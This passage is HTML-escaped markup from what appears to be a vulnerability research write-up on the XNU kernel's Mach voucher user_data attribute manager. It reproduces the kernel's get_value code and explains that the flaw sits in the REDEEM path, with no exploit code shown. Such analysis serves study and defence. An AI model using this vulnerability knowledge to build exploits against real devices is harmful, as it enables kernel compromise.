&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_flags&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_manager &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* never an out voucher */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IPC_VOUCHER_NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_flags &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_NONE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;switch&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;case&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;prev_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;case&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;USER_DATA_MAX_DATA &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_RESOURCE_SHORTAGE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* empty is the default */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;out_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;default&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* every other command is unknown */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s look at the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case, which is the command we put in our single sub-recipe. (The vulnerability is in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;code above but we need a lot more background before we get to that.) In the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span&gt;&amp;nbsp;case the input arbitrary byte buffer is passed to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;, then that return value is returned as the value of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;out_value&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.7bb6adaf52c18b6e3e2890205d992e9ab2854f2f\"&gt;&lt;/a&gt;&lt;a id=\"t.28\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span 